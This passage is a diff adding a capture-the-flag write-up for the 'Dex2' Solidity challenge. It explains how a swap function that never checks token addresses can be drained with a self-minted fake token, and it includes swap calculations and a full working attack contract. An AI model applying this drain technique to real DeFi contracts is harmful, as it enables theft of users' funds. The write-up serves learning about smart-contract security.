@@ -1134,4 +1134,96 @@ To complete this challenge, we need to deploy the hack contract and then approve
 
 So, what we can learn from this challenge is that we should be very careful while using divisions in solidity, also when delaing with prices of something in contracts, it is better not to rely on only one source of information, like was done in this challenge. Because, if that source gets hacked or compromised, then the whole system will become centralized and the person controlling the source of information can control the contract. Normally, we rely on external sources for prices by employing oracle networks. Again, using a single oracle can give rise to the same problem, so, a network of oracles can be used and when the data from these oracles are fetched, it can be aggregated to get a single value which can be trusted throughout the whole chain.
 
+___
+## Level 23 [Dex2]
+
+This level is exactly same as the previous level (Dex) except a small change in the `swap()` method. The goal is to drain both the token1 and token2 from the challenge contract.
+
+```solidity
+    function swap(address from, address to, uint256 amount) public {
+        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
+        uint256 swapAmount = getSwapAmount(from, to, amount);
+        IERC20(from).transferFrom(msg.sender, address(this), amount);
+        IERC20(to).approve(address(this), swapAmount);
+        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
+    }
+```
+
+Notice that no checks are being performed to ensure that the tokens that are being swapped are indeed the intended token1 and token2 in the challenge contract. This can be exploited easily by anyone by simply creating a token of their own, and swapping those tokens for the tokens of the challenge contract. Look at the table below to understand how the tokens have been swapped.
+
+|Dex  ||| Hack  |  |       |
+|------|------|------|-----|-----|-----|
+| token1|token2|fakeToken|token1|token2|fakeToken|
+|:------|------|------|-----|-----|-----:|
+|100|100|1|0|0|3|
+|0|100|2|100|0|2|
+|0|0|4|100|100|0|
+
+Initially, we mint a total of 4 tokens, to our hack contract, and transfer 1 of the tokens to the dex2 contract. This is done, since the balance of the instance address for fakeTokens is 0 and we can't have 0 as a denominator in the `getSwapAmount()` method to avoid division by zero error. Once this is done, we can start the swaps. Find the calculations for finding the amount of fakeToken to be swapped below -
+
+```
+number of token1 to be returned = (amount of fakeToken to be swapped * token1 balance of the contract)/fakeToken balance of the contract
+
+Swap 1 (for token1)-
+100 = (fakeTokenIn * 100)/1
+=> fakeTokenIn = (100 * 1)/100
+=> fakeTokenIn = 1
+
+Swap 2 (for token2)-
+100 = (fakeTokenIn * 100)/2
+=> fakeTokenIn = (100 * 2)/100
+=> fakeTokenIn = 2
+```
+
+Once these swaps are done, the challenge contract will be drained of both the tokens. Find the hack contract below.
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol';
+
+contract maliciousToken is ERC20 {
+    constructor() ERC20("fakeToken", "fT") {
+        _mint(msg.sender, 4);
+    }
+}
+
+interface IDex2 {
+    function token1() external view returns (address);
+    function token2() external view returns (address);
+    function swap(address from, address to, uint256 amount) external;
+    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);
+}
+
+contract hack {
+
+    IDex2 private immutable dex;
+    ERC20 private immutable token1;
+    ERC20 private immutable token2;
+
+    constructor (IDex2 target) {
+        dex = target;
+        token1 = ERC20(dex.token1());
+        token2 = ERC20(dex.token2());
+    }
+
+    function attack () external {
+        maliciousToken fakeToken = new maliciousToken();
+
+        fakeToken.transfer(address(dex), 1);
+
+        fakeToken.approve(address(dex), 100);
+
+        dex.swap(address(fakeToken), address(token1), 1);
+        dex.swap(address(fakeToken), address(token2), 2);
+
+        require(token1.balanceOf(address(dex))==0, "T1 is not 0!");
+        require(token2.balanceOf(address(dex))==0, "T2 is not 0!");
+    }
+}
+```
+
+I initially tried setting the approval for the dex contrcat to spend our fakeTokens to 2, overlooking the fact that the dex contract is spending a total of 3 tokens on behalf of us. So, later I updated the amount to be 100 to avoid any confusion.
+
 # More solutions coming soon!
